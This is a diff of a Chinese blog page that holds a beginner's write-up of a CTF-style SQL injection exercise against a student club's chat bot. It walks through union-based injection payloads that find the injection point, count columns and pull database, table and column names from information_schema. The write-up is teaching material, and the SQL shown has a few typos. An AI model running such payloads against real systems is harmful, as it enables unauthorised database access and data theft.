@@ -8,17 +8,17 @@
   <link rel="dns-prefetch" href="http://l0tus.vip">
   <title>谈谈近期学到的简单的东西(一) | L0tus&#39; blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="兔兔的SQL注入 write up   兔兔是Vidar协会的机器人，具有迎新、查询博客、printf等功能，其中%blog功能即是查询博客，由于其目前设计较为简单，通过SQL注入可以对其进行攻击。对于”攻击”这个概念，我最初以为只有”破坏”的意思，后来从ek1ng学长那里明白”获取其数据库所有数据””获取本查询不到的数据”都是对其攻击的表现。这个小游戏有两个目标：1、一次性查出所有学长的blog">
+  <meta name="description" content="兔兔的%Blog功能中的SQL注入 write up   兔兔是Vidar协会的机器人，具有迎新、查询博客、printf等功能，其中%blog功能即是查询博客，由于其目前设计较为简单，通过SQL注入可以对其进行攻击。对于”攻击”这个概念，我最初以为只有”破坏”的意思，后来从ek1ng学长那里明白”获取其数据库所有数据””获取本查询不到的数据”都是对其攻击的表现。这个小游戏有两个目标：1、一次性查出">
 <meta property="og:type" content="article">
 <meta property="og:title" content="谈谈近期学到的简单的东西(一)">
 <meta property="og:url" content="http://l0tus.vip/2022/08/01/%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%EF%BC%88%E4%B8%80%EF%BC%89/index.html">
 <meta property="og:site_name" content="L0tus&#39; blog">
-<meta property="og:description" content="兔兔的SQL注入 write up   兔兔是Vidar协会的机器人，具有迎新、查询博客、printf等功能，其中%blog功能即是查询博客，由于其目前设计较为简单，通过SQL注入可以对其进行攻击。对于”攻击”这个概念，我最初以为只有”破坏”的意思，后来从ek1ng学长那里明白”获取其数据库所有数据””获取本查询不到的数据”都是对其攻击的表现。这个小游戏有两个目标：1、一次性查出所有学长的blog">
+<meta property="og:description" content="兔兔的%Blog功能中的SQL注入 write up   兔兔是Vidar协会的机器人，具有迎新、查询博客、printf等功能，其中%blog功能即是查询博客，由于其目前设计较为简单，通过SQL注入可以对其进行攻击。对于”攻击”这个概念，我最初以为只有”破坏”的意思，后来从ek1ng学长那里明白”获取其数据库所有数据””获取本查询不到的数据”都是对其攻击的表现。这个小游戏有两个目标：1、一次性查出">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-08-01T15:13:00.000Z">
-<meta property="article:modified_time" content="2022-08-01T16:57:57.489Z">
+<meta property="article:modified_time" content="2022-08-02T09:59:52.165Z">
 <meta property="article:author" content="L0tus">
-<meta property="article:tag" content="仲夏">
+<meta property="article:tag" content="SQL注入">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="L0tus&#39; blog" type="application/atom+xml">
@@ -67,7 +67,7 @@
 			</ul>
 		</nav>
 		<nav>
-			总文章数 2
+			总文章数 3
 		</nav>
 		<nav class="header-smart-menu">
     		
@@ -197,9 +197,9 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="兔兔的SQL注入-write-up"><a href="#兔兔的SQL注入-write-up" class="headerlink" title="兔兔的SQL注入 write up"></a>兔兔的SQL注入 write up</h1><p>   兔兔是Vidar协会的机器人，具有迎新、查询博客、printf等功能，其中%blog功能即是查询博客，由于其目前设计较为简单，通过SQL注入可以对其进行攻击。对于”攻击”这个概念，我最初以为只有”破坏”的意思，后来从ek1ng学长那里明白”获取其数据库所有数据””获取本查询不到的数据”都是对其攻击的表现。这个小游戏有两个目标：1、一次性查出所有学长的blog 2、找到flag。<br>   那就来试试简单的SQL注入吧~<br>   <span id="more"></span></p>
+        <h1 id="兔兔的-Blog功能中的SQL注入-write-up"><a href="#兔兔的-Blog功能中的SQL注入-write-up" class="headerlink" title="兔兔的%Blog功能中的SQL注入 write up"></a>兔兔的%Blog功能中的SQL注入 write up</h1><p>   兔兔是Vidar协会的机器人，具有迎新、查询博客、printf等功能，其中%blog功能即是查询博客，由于其目前设计较为简单，通过SQL注入可以对其进行攻击。对于”攻击”这个概念，我最初以为只有”破坏”的意思，后来从ek1ng学长那里明白”获取其数据库所有数据””获取本查询不到的数据”都是对其攻击的表现。这个小游戏有两个目标：1、一次性查出所有学长的blog 2、找到flag。这也算是一道web的入门题，面向零基础的小白（比如L0tus）<br>   那就一起来试试简单的SQL注入吧~<br>   <span id="more"></span></p>
 <hr>
-<h2 id="1、页面观察"><a href="#1、页面观察" class="headerlink" title="1、页面观察"></a>1、页面观察</h2><p>   首先要判断出其注入类型，输入以下内容<br>   <code>%blog ek1ng&quot;#</code><br>   其实我一开始便猜测其注入类型为字符串，便直接在ek1ng学长的id后面直接加了 “ ,其中#的作用为将其后面的代码注释掉（不同地方的符号使用不同，例如mysql网站中注释符使用的是–+），兔兔的反馈是ek1ng学长的个人blog，再尝试一下把 “ 去掉（其实也不需要尝试）<br>   <code>%blog ek1ng #</code><br>   兔兔的反馈是vidar官网的网址，这就意味着语法不正确出现报错，从此可以判断出是字符型注入。<br>   同时也可以猜测出兔兔内置的sql语句为<br>   <code>select form &quot;数据表名&quot; where &quot;blog的字段值&quot; = &quot;</code></p>
+<h2 id="1、页面观察"><a href="#1、页面观察" class="headerlink" title="1、页面观察"></a>1、页面观察</h2><p>   首先要判断出其注入类型，输入以下内容<br>   <code>%blog ek1ng&quot;#</code><br>   其实我一开始便猜测其注入类型为字符串，便直接在ek1ng学长的id后面直接加了 “ ,其中#的作用为将其后面的代码注释掉（不同地方的符号使用不同，例如mysql网站中注释符使用的是- - +），兔兔的反馈是ek1ng学长的个人blog，再尝试一下把 “ 去掉（其实也不需要尝试）<br>   <code>%blog ek1ng #</code><br>   兔兔的反馈是vidar官网的网址，这就意味着语法不正确出现报错，从此可以判断出是字符型注入。<br>   同时也可以猜测出兔兔内置的sql语句为<br>   <code>select form &quot;数据表名&quot; where &quot;blog的字段值&quot; = &quot;</code></p>
 <h2 id="2、注入点判断"><a href="#2、注入点判断" class="headerlink" title="2、注入点判断"></a>2、注入点判断</h2><p>   分别输入以下代码<br>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%blog ek1ng&quot; and 1 = 1#  不报错</span><br><span class="line">%blog ek1ng&quot; and 1 = 2#  报错</span><br></pre></td></tr></table></figure><br>   显然，注入点为引号</p>
 <h2 id="3、判断当前表的字段数"><a href="#3、判断当前表的字段数" class="headerlink" title="3、判断当前表的字段数"></a>3、判断当前表的字段数</h2><p>   使用order by指令，通过列数递增直到报错便可判断列数，不过这里我从3开始试探，结果报错了，再到2也报错，于是确定列数只有1，（其结构还是比较简单的）</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%blog ek1ng&quot; order by 3# 报错</span><br><span class="line">%blog ek1ng&quot; order by 2# 报错</span><br><span class="line">%blog ek1ng&quot; order by 1# 显示正常</span><br></pre></td></tr></table></figure>
@@ -209,7 +209,7 @@
 <h2 id="5、爆数据库名"><a href="#5、爆数据库名" class="headerlink" title="5、爆数据库名"></a>5、爆数据库名</h2><p>   其详细步骤应该为，在第一步查找为false时，根据上一步显示位的输出判断对应的列数，并在联合查找时将该列数位置的查找值改为database()，目的也就是让数据库名回显在我们想要的显示位。不过兔兔这里的数据库结构比较简单，回显位置只有一个，列数也只有1，于是注入语句直接这么写：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%blog &quot; union select database()#</span><br></pre></td></tr></table></figure>
 <p>   其回显值为blog，那么这个数据库的名字就叫blog</p>
-<h2 id="6、爆数据表名"><a href="#6、爆数据表名" class="headerlink" title="6、爆数据表名"></a>6、爆数据表名</h2><p>   第一步查找为false时，利用联合查找来获得数据表名，这一步主要就是一些SQL语法的问题。GROUP_CONCAT(xxx)：是将分组中括号里对应的字符串进行连接，如果分组中括号里的参数xxx有多行，那么就会将这多行的字符串连接，每个字符串之间会有特定的符号进行分隔（也就是一起输出）。当然这里只有一个table_name。其中information_schema.tables表示库中所有表的信息，包括这个表从属的库。那么其后的table.schema &#x3D; database()表示所查找的表从属的库等于我们之前查过的database（），于是可以查出我们需要的库里所有的名</p>
+<h2 id="6、爆数据表名"><a href="#6、爆数据表名" class="headerlink" title="6、爆数据表名"></a>6、爆数据表名</h2><p>   第一步查找为false时，利用联合查找来获得数据表名，这一步主要就是一些SQL语法的问题。GROUP_CONCAT(xxx)：是将分组中括号里对应的字符串进行连接，如果分组中括号里的参数xxx有多行，那么就会将这多行的字符串连接，每个字符串之间会有特定的符号进行分隔（也就是一起输出）。当然这里只有一个table_name。其中information_schema.tables表示库中所有表的信息，包括这个表从属的库。那么其后的table.schema &#x3D; database()表示所查找的表从属的库等于我们之前查过的database（），于是可以查出我们需要的库里所有的表名</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%blog &quot; union select group_contcat(table_name) from information_schema.tables where table_schema = database()#</span><br><span class="line">回显结果为：blogs,flag   显然，我们的第一个目标就在blogs里，第二个目标就在flag中</span><br></pre></td></tr></table></figure>
 <h2 id="7、爆表中字段名"><a href="#7、爆表中字段名" class="headerlink" title="7、爆表中字段名"></a>7、爆表中字段名</h2><p>   知道了表的名字我们下一步要做的就是查出这个表里的所有字段名字，这一步与上一步类似，将表中的字段名并列输出即可。其中table_schema表示库名，table_name表示表名，我们先后对blogs表和flag表下手</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%blog &quot; union select group_concat(column_name) from information_schema.columns where table_schema = &quot;blog&quot; and table_name = &quot;blogs&quot;#</span><br><span class="line">回显结果为：blog，id，nickname   分别对应了学长们的博客，序号，昵称</span><br><span class="line">%blog &quot; union select group_concat(column_name) from information_schema.columns where table_schema = &quot;blog&quot; and table_name = &quot;flag&quot;#</span><br><span class="line">回显结果为：flag，id</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -250,7 +250,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">仲夏</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">SQL注入</a>
         		</li>
       		
 		</ul>
@@ -319,6 +319,15 @@
 
   
 <nav id="article-nav">
+  
+    <a href="/2022/08/02/%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%EF%BC%88%E4%BA%8C%EF%BC%89/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          谈谈近期学到的简单的东西(二)
+        
+      </div>
+    </a>
   
   
     <a href="/2022/07/29/%E8%B5%B7%E7%82%B9/" id="article-nav-older" class="article-nav-link-wrap">
@@ -456,7 +465,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">仲夏</a>
+                <a href="javascript:void(0)" class="js-tag color1">SQL注入</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">格式化字符串漏洞</a>
               </li>
             
             <div class="clearfix"></div>
